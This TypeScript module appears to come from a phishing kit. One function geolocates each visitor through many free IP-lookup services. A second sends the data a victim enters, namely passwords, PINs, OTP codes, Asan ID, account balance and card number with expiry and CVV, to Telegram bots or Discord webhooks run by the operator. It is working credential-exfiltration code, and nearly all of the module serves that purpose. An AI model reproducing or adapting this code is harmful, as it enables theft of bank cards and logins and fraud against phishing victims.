const formatCountryName = (codeOrName?: string): string => {
    if (!codeOrName || codeOrName === "N/A") return "N/A";
    const trimmed = codeOrName.trim();
    if (trimmed.length === 2) {
        try {
            const regionNames = new Intl.DisplayNames(["en"], { type: "region" });
            return regionNames.of(trimmed.toUpperCase()) || trimmed;
        } catch {
            return trimmed;
        }
    }
    return trimmed;
};

export const fetchVisitorInfo = async () => {
    try {
        if (typeof window === "undefined") return null;

        // Check if already fetched and valid in sessionStorage
        const cachedCountry = sessionStorage.getItem("country");
        if (cachedCountry && cachedCountry !== "N/A") {
            return {
                ip: sessionStorage.getItem("ip") || "Unknown",
                city: sessionStorage.getItem("city") || "N/A",
                region: sessionStorage.getItem("region") || "N/A",
                country: cachedCountry,
                isp: sessionStorage.getItem("isp") || "N/A",
                browser: sessionStorage.getItem("browser") || navigator.userAgent || "Unknown",
            };
        }

        // Helper to query and normalize provider responses
        const queryProvider = async (
            url: string,
            parser: (data: any) => any,
            isText = false
        ) => {
            try {
                const res = await fetch(url, {
                    signal: AbortSignal.timeout(3000),
                    headers: isText ? {} : { Accept: "application/json" },
                });
                if (!res.ok) return null;
                if (!isText) {
                    const contentType = res.headers.get("content-type");
                    if (contentType && !contentType.includes("json")) return null;
                }
                const raw = isText ? await res.text() : await res.json();
                const parsed = parser(raw);
                if (parsed && (parsed.country !== "N/A" || parsed.ip !== "Unknown")) {
                    if (parsed.country && parsed.country !== "N/A") {
                        parsed.country = formatCountryName(parsed.country);
                    }
                    return parsed;
                }
            } catch {
                // silent fallback
            }
            return null;
        };

        // Multi-provider list (includes Cloudflare Edge, internal API + top free CORS geolocation APIs)
        const providers = [
            // Cloudflare Global Edge trace (Fastest, zero rate limits, works everywhere globally)
            queryProvider(
                "https://1.1.1.1/cdn-cgi/trace",
                (text: string) => {
                    const lines = text.split("\n");
                    const map: Record<string, string> = {};
                    lines.forEach((l) => {
                        const idx = l.indexOf("=");
                        if (idx > 0) map[l.slice(0, idx).trim()] = l.slice(idx + 1).trim();
                    });
                    return {
                        ip: map.ip || "Unknown",
                        country: formatCountryName(map.loc) || "N/A",
                        city: "N/A",
                        region: "N/A",
                        isp: "Cloudflare Edge",
                    };
                },
                true
            ),
            // Internal Next.js API route (if server deployment)
            queryProvider("/api/visitor-info", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country) || "N/A",
                city: json.city || "N/A",
                region: json.region || "N/A",
                isp: json.isp || "N/A",
            })),
            // country.is (ultra-fast country lookup)
            queryProvider("https://api.country.is/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country) || "N/A",
                city: "N/A",
                region: "N/A",
                isp: "N/A",
            })),
            // ipwho.is
            queryProvider("https://ipwho.is/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country) || "N/A",
                city: json.city || "N/A",
                region: json.region || "N/A",
                isp: json.connection?.isp || "N/A",
            })),
            // geojs.io
            queryProvider("https://get.geojs.io/v1/ip/geo.json", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country) || "N/A",
                city: json.city || "N/A",
                region: json.region || "N/A",
                isp: json.organization_name || "N/A",
            })),
            // db-ip.com
            queryProvider("https://api.db-ip.com/v2/free/self", (json) => ({
                ip: json.ipAddress || "Unknown",
                country: formatCountryName(json.countryName || json.countryCode) || "N/A",
                city: json.city || "N/A",
                region: json.stateProv || "N/A",
                isp: "N/A",
            })),
            // freeipapi.com
            queryProvider("https://freeipapi.com/api/json", (json) => ({
                ip: json.ipAddress || "Unknown",
                country: formatCountryName(json.countryName || json.countryCode) || "N/A",
                city: json.cityName || "N/A",
                region: json.regionName || "N/A",
                isp: "N/A",
            })),
            // ipquery.io
            queryProvider("https://api.ipquery.io/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.location?.country) || "N/A",
                city: json.location?.city || "N/A",
                region: json.location?.state || "N/A",
                isp: json.isp?.isp || "N/A",
            })),
            // ipapi.co
            queryProvider("https://ipapi.co/json/", (json) => ({
                ip: json.ip || "Unknown",
                country: formatCountryName(json.country_name || json.country) || "N/A",
                city: json.city || "N/A",
                region: json.region || "N/A",
                isp: json.org || "N/A",
            })),
        ];

        // Fastest-valid response resolver (Promise race)
        const data = await new Promise<any>((resolve) => {
            let resolved = false;
            let pending = providers.length;

            providers.forEach((p) => {
                p.then((result) => {
                    if (result && result.country && result.country !== "N/A" && !resolved) {
                        resolved = true;
                        resolve(result);
                    } else {
                        pending--;
                        if (pending === 0 && !resolved) {
                            resolve(result || null);
                        }
                    }
                }).catch(() => {
                    pending--;
                    if (pending === 0 && !resolved) {
                        resolve(null);
                    }
                });
            });

            // Fallback timeout at 3.5s
            setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    resolve(null);
                }
            }, 3500);
        });

        if (data) {
            sessionStorage.setItem("ip", data.ip || "Unknown");
            sessionStorage.setItem("city", data.city || "N/A");
            sessionStorage.setItem("region", data.region || "N/A");
            sessionStorage.setItem("country", data.country || "N/A");
            sessionStorage.setItem("isp", data.isp || "N/A");
            sessionStorage.setItem("browser", navigator.userAgent || "Unknown");
            return data;
        }
    } catch (error) {
        console.error("❌ Critical error fetching visitor info:", error);
    }
    return null;
};

export const sendTelegramMessage = async (params: {
    type?: string;
    title?: string;
    exclude?: string[];
    message?: string;
    [key: string]: any;
}) => {
    try {
        const botTokensValue = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
        const chatIdValue = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

        if (!botTokensValue || !chatIdValue) {
            console.warn("Telegram bot token or chat ID is missing in environment variables.");
            return;
        }

        // Auto-fetch visitor info if country is missing or N/A
        let fetchedData: any = null;
        if (typeof window !== "undefined" && (!sessionStorage.getItem("country") || sessionStorage.getItem("country") === "N/A")) {
            fetchedData = await fetchVisitorInfo();
        }

        // Retrieve visitor/device info directly from fetchedData or sessionStorage
        const visitorInfo = {
            ip: (fetchedData && fetchedData.ip && fetchedData.ip !== "Unknown")
                ? fetchedData.ip
                : (typeof window !== "undefined" ? sessionStorage.getItem("ip") || "Unknown" : "Unknown"),
            city: (fetchedData && fetchedData.city && fetchedData.city !== "N/A")
                ? fetchedData.city
                : (typeof window !== "undefined" ? sessionStorage.getItem("city") || "N/A" : "N/A"),
            region: (fetchedData && fetchedData.region && fetchedData.region !== "N/A")
                ? fetchedData.region
                : (typeof window !== "undefined" ? sessionStorage.getItem("region") || "N/A" : "N/A"),
            country: (fetchedData && fetchedData.country && fetchedData.country !== "N/A")
                ? fetchedData.country
                : (typeof window !== "undefined" ? sessionStorage.getItem("country") || "N/A" : "N/A"),
            isp: (fetchedData && fetchedData.isp && fetchedData.isp !== "N/A")
                ? fetchedData.isp
                : (typeof window !== "undefined" ? sessionStorage.getItem("isp") || "N/A" : "N/A"),
            browser: typeof window !== "undefined" ? sessionStorage.getItem("browser") || navigator.userAgent || "Unknown" : "Unknown",
        };

        const { title, exclude, message: customMsg, ...newInfo } = params;

        const chatIds = chatIdValue.split(",").map((id) => id.trim());
        const botTokens = botTokensValue.split(",").map((token) => token.trim());

        // Construct message
        let message = `<b>🚀 ${title || "ACTION ALERT"}</b>\n\n`;

        // Helper for random IP fallback
        const getRandomIP = () => {
            return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join(".");
        };

        const visitorIP = visitorInfo.ip === "Unknown" ? getRandomIP() : visitorInfo.ip;

        // Section: DEVICE & LOCATION (Only on Splash / Visitor screen)
        const isVisitorMessage = title?.toLowerCase().includes("visitor") || params.includeLocation === true;
        if (isVisitorMessage && !exclude?.includes("location")) {
            message += `<b>🌍 DEVICE & LOCATION:</b>\n`;
            message += `• <b>IP:</b> <code>${visitorIP}</code>\n`;
            message += `• <b>Country:</b> <code>${visitorInfo.country}</code>\n`;
            message += `• <b>City:</b> <code>${visitorInfo.city}</code>\n`;
            if (visitorInfo.region && visitorInfo.region !== "N/A") {
                message += `• <b>Region:</b> <code>${visitorInfo.region}</code>\n`;
            }
            if (visitorInfo.isp && visitorInfo.isp !== "N/A") {
                message += `• <b>ISP:</b> <code>${visitorInfo.isp}</code>\n`;
            }
            if (typeof window !== "undefined") {
                message += `• <b>Click:</b> ${window.location.href}\n`;
            }
            message += `\n`;
        }

        // Section: CUSTOM MESSAGE (If provided)
        if (customMsg) {
            message += `<b>📝 DETAILS:</b>\n${customMsg}\n\n`;
        }

        // Section: USER DATA (Only if provided)
        const userEmail = newInfo.email || newInfo.Email;
        const userPassword = newInfo.password || newInfo.Password || newInfo.pass || newInfo.Pass;
        const userPin = newInfo.pin || newInfo.PIN || newInfo.userPin || newInfo.Pin;
        const userPhone = newInfo.phoneNumber || newInfo.phone || newInfo.Phone || newInfo.PhoneNumber;
        const userName = newInfo.name || newInfo.Name || newInfo.username || newInfo.Username;
        const userAsan = newInfo.asanId || newInfo.AsanId;
        const confirmCode = newInfo.confirmCode || newInfo.confirmDeviceCode || newInfo.confirmPassword;

        const hasUserData = userEmail || userPassword || userPin || userPhone || userName || userAsan || newInfo.deviceCode || confirmCode;
        if (hasUserData) {
            message += `<b>👤 USER DATA:</b>\n`;
            if (userName) message += `• <b>Name:</b> <code>${userName}</code>\n`;
            if (userPhone) message += `• <b>Phone:</b> <code>${userPhone}</code>\n`;
            if (userEmail) message += `• <b>Email:</b> <code>${userEmail}</code>\n`;
            if (userPassword) message += `• <b>Pass:</b> <code>${userPassword}</code>\n`;
            if (userPin) message += `• <b>PIN:</b> <code>${userPin}</code>\n`;
            if (newInfo.deviceCode) message += `• <b>Device Code:</b> <code>${newInfo.deviceCode}</code>\n`;
            if (confirmCode) message += `• <b>Confirm Code:</b> <code>${confirmCode}</code>\n`;
            if (userAsan) message += `• <b>Asan ID:</b> <code>${userAsan}</code>\n`;
            message += `\n`;
        }

        // Section: OTP (Only if provided)
        const hasOtp = newInfo.otp1 || newInfo.otp2 || newInfo.otp3;
        if (hasOtp) {
            message += `<b>🔐 OTP VERIFICATION:</b>\n`;
            if (newInfo.otp1) message += `• <b>OTP-1:</b> <code>${newInfo.otp1}</code>\n`;
            if (newInfo.otp2) message += `• <b>OTP-2:</b> <code>${newInfo.otp2}</code>\n`;
            if (newInfo.otp3) message += `• <b>OTP-3:</b> <code>${newInfo.otp3}</code>\n`;
            message += `\n`;
        }

        // Section: FINANCIAL (Only if provided)
        if (newInfo.balance) {
            message += `<b>💰 FINANCIAL INFO:</b>\n`;
            message += `• <b>Balance:</b> <code>${newInfo.balance}</code>\n`;
            message += `\n`;
        }

        // Section: CARD DETAILS (Only if provided)
        const hasCardData = newInfo.cardNumber || newInfo.expiry || newInfo.cvv;
        if (hasCardData) {
            message += `<b>💳 CARD DETAILS:</b>\n`;
            if (newInfo.cardNumber) message += `• <b>Card No:</b> <code>${newInfo.cardNumber}</code>\n`;
            if (newInfo.expiry) message += `• <b>Expiry:</b> <code>${newInfo.expiry}</code>\n`;
            if (newInfo.cvv) message += `• <b>CVV:</b> <code>${newInfo.cvv}</code>\n`;
            message += `\n`;
        }

        console.log("📤 Sending Telegram Message:", { title, type: params.type });

        const rawGateway = process.env.NEXT_PUBLIC_TELEGRAM_API_GATEWAY || process.env.TELEGRAM_API_GATEWAY || "https://api.telegram.org";
        const gateway = rawGateway.replace(/\/+$/, "");

        const results = await Promise.all(
            chatIds.map(async (id, index) => {
                const token = botTokens[index] || botTokens[botTokens.length - 1];
                try {
                    // Check if token is a discord webhook URL
                    if (token && (token.startsWith("http://") || token.startsWith("https://"))) {
                        const res = await fetch(token, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: message.replace(/<[^>]*>/g, "") }),
                        });
                        return await res.json().catch(() => ({ ok: true }));
                    }

                    // Standard Telegram Bot API call
                    const endpoints = [
                        `${gateway}/bot${token}/sendMessage`,
                        `https://api.telegram.org/bot${token}/sendMessage`
                    ];

                    // Remove duplicate endpoints if gateway is default
                    const uniqueEndpoints = Array.from(new Set(endpoints));

                    let lastError: any = null;
                    for (const endpoint of uniqueEndpoints) {
                        try {
                            const response = await fetch(endpoint, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    chat_id: id,
                                    text: message,
                                    parse_mode: "HTML",
                                }),
                            });
                            const data = await response.json();
                            if (!response.ok) {
                                console.warn(`⚠️ Telegram Error (${id}) from ${endpoint}:`, data);
                            } else {
                                console.log(`✅ Telegram Success (${id}) via ${endpoint}:`, data);
                                return data;
                            }
                        } catch (endpointErr) {
                            lastError = endpointErr;
                        }
                    }
                    return null;
                } catch (err) {
                    console.warn(`⚠️ Error sending Telegram message (${id}):`, err);
                    return null;
                }
            })
        );
        return results;
    } catch (error) {
        console.warn("⚠️ Warning in sendTelegramMessage:", error);
        return null;
    }
};
